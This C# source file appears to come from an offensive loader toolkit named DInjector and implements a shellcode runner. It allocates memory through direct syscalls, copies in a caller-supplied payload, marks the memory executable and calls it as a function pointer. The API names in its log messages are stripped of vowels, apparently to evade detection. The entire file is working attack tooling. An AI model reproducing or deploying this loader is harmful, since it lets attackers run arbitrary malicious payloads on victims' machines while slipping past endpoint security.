using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class FunctionPointer
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void FunctionPtr();

        public static void Execute(byte[] shellcode, bool debug = false)
        {
            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(FunctionPointer) [+] NtAllctVrtlMmry, PAGE_READWRITE");
            else
                throw new Exception($"(FunctionPointer) [-] NtAllctVrtlMmry, PAGE_READWRITE: {ntstatus}");

            #endregion

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            IntPtr protectAddress = baseAddress;
            regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(FunctionPointer) [+] NtPrtctVrtlMmry, PAGE_EXECUTE_READ");
            else
                throw new Exception($"(FunctionPointer) [-] NtPrtctVrtlMmry, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            FunctionPtr f = (FunctionPtr)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(FunctionPtr));
            f();

            #region CleanUp: NtFreeVirtualMemory (shellcode)

            regionSize = (IntPtr)shellcode.Length;

            ntstatus = Syscalls.NtFreeVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_RELEASE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(FunctionPointer.CleanUp) [+] NtFrVrtlMmry, shellcode");
            else
                throw new Exception($"(FunctionPointer.CleanUp) [-] NtFrVrtlMmry, shellcode: {ntstatus}");

            #endregion
        }
    }
}